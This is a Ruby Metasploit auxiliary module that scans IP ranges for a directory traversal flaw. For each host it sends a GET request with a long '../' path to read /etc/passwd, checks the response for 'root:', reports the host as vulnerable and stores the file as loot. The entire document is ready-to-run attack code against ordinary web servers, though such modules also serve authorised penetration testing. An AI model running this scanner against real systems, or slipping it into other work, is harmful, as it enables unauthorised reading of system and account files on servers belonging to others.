require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Directory Traversal Scanner',
      'Description' => 'Scans for a directory traversal vulnerability by attempting to access the /etc/passwd file.',
      'Author'      => 'K3ysTr0K3R',
      'License'     => MSF_LICENSE,
      'References'  => [
        ['URL', 'https://owasp.org/www-community/attacks/Path_Traversal']
      ]
    )

    register_options(
      [
        OptAddressRange.new('RHOSTS', [true, 'Target address range or CIDR identifier']),
        OptInt.new('RPORT', [true, 'Target port', 80]),
        OptBool.new('SSL', [false, 'Use SSL', false]),
        OptInt.new('THREADS', [false, 'Number of concurrent threads', 10])
      ]
    )
  end

  def run_host(ip)
    scheme = datastore['SSL'] ? 'https' : 'http'
    rport = datastore['RPORT']

    begin
      url = "#{scheme}://#{ip}:#{rport}/../../../../../../../../../../../../../etc/passwd"
      response = send_request_raw({
        'method' => 'GET',
        'uri'    => url
      })

      if response && response.body.include?('root:')
        print_good("Directory traversal vulnerability found on #{ip}")
        report_vuln(
          host: ip,
          port: rport,
          proto: 'tcp',
          name: 'Directory Traversal',
          refs: ['https://owasp.org/www-community/attacks/Path_Traversal'],
          info: 'Vulnerable to directory traversal allowing access to /etc/passwd'
        )
        store_loot('etc.passwd', 'text/plain', ip, response.body, 'passwd.txt', 'Contents of /etc/passwd')
      else
        print_status("No directory traversal vulnerability found on #{ip}")
      end
    rescue ::Rex::ConnectionError
      vprint_error("Failed to connect to #{ip}:#{rport}")
    rescue ::Rex::TimeoutError
      vprint_error("Timeout while connecting to #{ip}:#{rport}")
    end
  end
end
